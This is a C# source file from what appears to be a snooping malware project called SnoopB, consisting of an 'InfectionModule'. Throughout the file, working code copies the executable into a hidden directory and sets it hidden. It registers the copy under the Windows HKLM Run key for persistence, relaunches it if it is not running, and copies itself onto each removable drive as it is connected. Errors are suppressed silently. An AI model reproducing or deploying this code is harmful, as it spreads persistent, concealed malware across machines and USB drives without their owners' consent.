using System;
using System.IO;
using Microsoft.Win32;
using SnoopB.Configuration;
using SnoopB.DriveDetector.Infection;

namespace SnoopB.Modules.Infection
{
    /// <summary>
    /// Provide infection functionalities, can infect a machine, and run the instance
    /// </summary>
    internal class InfectionModule : Module
    {
        public InfectionModule(int interval) : base(interval)
        {
            InitDriveDetector();
        }

        private void InitDriveDetector()
        {
            try
            {
                var driveDetector = new DriveDetector.Infection.DriveDetector();
                driveDetector.DeviceArrived += OnDriveConnected;
            }
            catch (Exception)
            {
            }
        }

        private void OnDriveConnected(object sender, DriveDetectorEventArgs e)
        {
            this.Execute(InfectionType.ConnectedDrive, e.Drive);
        }

        #region [ Module ]

        public new static string ModuleId
        {
            get { return "9e681527-fe98-4f93-8c97-fcc2071c7334"; }
        }

        protected override void ExecuteInternal()
        {
            //we ensure, not run without parameters
            if(Parameters == null || Parameters.Length == 0)
                return;

            var _infectionType = (InfectionType)Parameters[0];

            switch (_infectionType)
            {
                case InfectionType.ConnectedDrive:
                    {
                        var drive = (string) Parameters[1];
                        InfectDrive(drive);
                    }
                    break;

                case InfectionType.CurrentMachine:
                    InfectCurrentMachine();
                    break;
            }
        }

        #endregion

        private void InfectCurrentMachine()
        {
            try
            {
                if (!IsInfected())
                {
                    //no infected, we need infect
                    CreateDirectory(Configurator.Instance.MainDirectory);
                    CopyFile(Configurator.Instance.FullFileNamePath);
                    SetupStartup(Configurator.Instance.FullFileNamePath);
                }

                //With the machine infected, we run the process, if it not running yet
                InitProcessIfNotIsRunning(Configurator.Instance.FullFileNamePath);

            }
            catch (Exception)
            {

            }
        }

        private void InfectDrive(string drive)
        {
            var newPath = Path.Combine(drive, Configurator.Instance.FileNameWithExtension);

            if (!File.Exists(newPath))
                File.Copy(Configurator.Instance.FullFileNamePath, newPath, true);

            File.SetAttributes(newPath, FileAttributes.Normal);
        }

        private bool IsInfected()
        {
            return Directory.Exists(Configurator.Instance.MainDirectory) && File.Exists(Configurator.Instance.FullFileNamePath);
        }

        private void CreateDirectory(string mainDirectory)
        {
            if (!Directory.Exists(mainDirectory))
                Directory.CreateDirectory(mainDirectory);
        }

        private void CopyFile(string exePath)
        {
            //Copy and hide the copied file.
            if (File.Exists(exePath)) 
                return;

            File.Copy(Path.Combine(Configurator.Instance.CurrentExecutionPath, Configurator.Instance.FileNameWithExtension), exePath);
            File.SetAttributes(exePath, File.GetAttributes(exePath) | FileAttributes.Hidden);
        }

        private void SetupStartup(string exePath)
        {
            var rkApp = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            if (rkApp != null)
                rkApp.SetValue(Configurator.Instance.FileNameWithoutExtension, exePath);
        }

        private void InitProcessIfNotIsRunning(string exePath)
        {
            var initProcess = true;
            foreach (var p in System.Diagnostics.Process.GetProcesses())
            {
                if (p.ProcessName == Configurator.Instance.FileNameWithoutExtension && p.MainModule.FileName == Configurator.Instance.FullFileNamePath)
                {
                    initProcess = false;
                    break;
                }
            }

            if (initProcess)
                System.Diagnostics.Process.Start(exePath);
        }
    }

    internal enum InfectionType
    {
        CurrentMachine,
        ConnectedDrive
    }
}